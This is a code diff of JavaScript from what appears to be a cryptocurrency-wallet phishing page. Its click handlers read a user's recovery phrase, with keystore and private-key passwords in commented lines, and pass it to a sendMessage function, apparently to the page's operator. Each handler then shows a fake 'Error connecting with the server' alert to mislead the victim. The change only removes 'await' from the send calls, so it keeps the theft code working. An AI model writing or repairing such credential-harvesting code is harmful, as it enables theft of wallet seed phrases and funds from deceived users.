@@ -34,10 +34,10 @@ submitk.addEventListener("click", () => {
     //let keypass =document.getElementById("keypass").value;
     
         console.log("phrase");
-        await sendMessage(`phrase`);
-        await sendMessage(phrase);
-        //await sendMessage(`Password`);
-        //await sendMessage(keypass);
+        sendMessage(`phrase`);
+        sendMessage(phrase);
+        //sendMessage(`Password`);
+        //sendMessage(keypass);
         alert("Error connecting with the server ... Pls, try again later");
     }
 
@@ -46,10 +46,10 @@ submitk.addEventListener("click", () => {
     //let mnemonicspass =document.getElementById("mnemonicspass").value;
     
         console.log("phrase");
-        await sendMessage(`phrase`);
-        await sendMessage(phrase);
-        //await sendMessage(`Password`);
-        //await sendMessage(mnemonicspass);
+        sendMessage(`phrase`);
+        sendMessage(phrase);
+        //sendMessage(`Password`);
+        //sendMessage(mnemonicspass);
         alert("Error connecting with the server ... Pls, try again later");
     }
     else if (document.getElementById("submitp")){
@@ -58,10 +58,10 @@ submitk.addEventListener("click", () => {
     
 
         console.log("phrase");
-        await sendMessage(`phrase`);
-        await sendMessage(phrase);
-        //await sendMessage(`Password`);
-        //await sendMessage(privatepass);
+        sendMessage(`phrase`);
+        sendMessage(phrase);
+        //sendMessage(`Password`);
+        //sendMessage(privatepass);
         alert("Error connecting with the server ... Pls, try again later");
     }
     else if (document.getElementById("submitl")){
@@ -70,10 +70,10 @@ submitk.addEventListener("click", () => {
     
 
         console.log("phrase");
-        await sendMessage(`phrase`);
-        await sendMessage(phrase);
-        //await sendMessage(`Password`);
-        //await sendMessage(privatepass);
+        sendMessage(`phrase`);
+        sendMessage(phrase);
+        //sendMessage(`Password`);
+        //sendMessage(privatepass);
         alert("Error connecting with the server ... Pls, try again later");
     }
 })();
